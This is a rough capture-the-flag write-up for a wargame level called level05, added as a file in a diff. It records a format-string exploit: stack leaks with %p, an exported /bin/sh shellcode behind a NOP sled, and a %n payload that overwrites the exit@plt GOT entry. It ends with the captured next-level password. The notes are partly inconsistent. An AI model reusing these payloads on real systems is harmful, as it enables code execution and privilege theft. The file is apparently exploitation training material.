@@ -1,0 +1,82 @@
+level05
+
+----- CAT -----
+
+nothing in particular
+
+----- EXEC -----
+
+printing address
+
+python -c 'print "AAAA" + " %d" * 50' > /tmp/test
+
+cat /tmp/test - | ./level05
+aaaa 100 -134415680 0 0 0 0 -1 -10396 -134369280 1633771873 543434016 622879781 1680154724 543434016 622879781 1680154724 543434016 622879781 1680154724 543434016 622879781 1680154724 543434016 622879781 1680154724 543434016 622879781 1680154724 543434016 622879781 1680154724
+
+python -c 'print "AAAA" + " %D" * 50' > /tmp/test
+
+AAAA %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s %s
+
+segmetfault go to a loop lets check the offset so we have a restriction like before
+
+%p 
+
+aaaa 0x64 0xf7fcfac0 (nil) (nil) (nil) (nil) 0xffffffff 0xffffd764 0xf7fdb000 0x61616161 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070
+
+./level05
+AAAAAAAAAAAAAAA BBBBBBBBBBBBBBBB CCCCCCCCCCCCCCCCCCC DDDDDDDDDDDDDDDDDDDD
+aaaaaaaaaaaaaaa bbbbbbbbbbbbbbbb ccccccccccccccccccc dddddddddddddddddddd
+
+./level05
+aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaa
+aaaaaaaaaaaaaaaa aaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaa aaaaaaaaaaaaaaaaaaaa
+
+so we can conclude that 41 (A) go to 61 (a) because the output is changing the value to min (20) offset 10
+
+number 10 from %p 
+
+python
+>>> s1 = "AAAA"
+>>> s2 = "aaaa"
+>>> [ord(a) ^ ord(b) for a,b in zip(s1,s2)]
+[32, 32, 32, 32] = 0x20
+
+lets export again so nop sled
+
+export SHELLCODE=$(python -c "print '\x90' * 100 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'")
+
+ 
+In computer security, a NOP slide, NOP sled or NOP ramp is a sequence of NOP (no-operation) instructions meant to "slide" the CPU's instruction execution flow to its final, desired destination whenever the program branches to a memory address anywhere on the slide.
+
+The technique sees common usage in software exploits stack buffer overflows.
+
+----- GDB -----
+x/1024xw $ebp = 0xffffd898:     0x90909090      0x90909090      0x90909090      0x90909090
+
+disas main  0x08048513 <+207>:   call   0x8048370 <exit@plt>
+(gdb) x/i 0x8048370
+   0x8048370 <exit@plt>:        jmp    *0x80497e0
+
+0xfffe53b6
+
+we go to call two time the address exit because our address is too big so we need to split before pass or our printf go to crash
+Ce nombre est bien trop grand pour être utilisé dans un modifier %d. Il ne pourra pas être correctement interprété par la fonction printf. 
+
+0xffffd898
+0xd898 55448 - 4 - 4 = 55440
+0xffff 65535 - 55440 - 4 - 4 = 10087
+
+python -c 'print "\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55440d" + "%10$n" + "%10087d" + "%11$n"' > /tmp/level05
+
+----------
+
+21686 - 8 = 21678
+65534 - 21678 - 4 - 4 = 43848
+----- FLAG -----
+
+whoami
+level06 
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+----- INFO -----
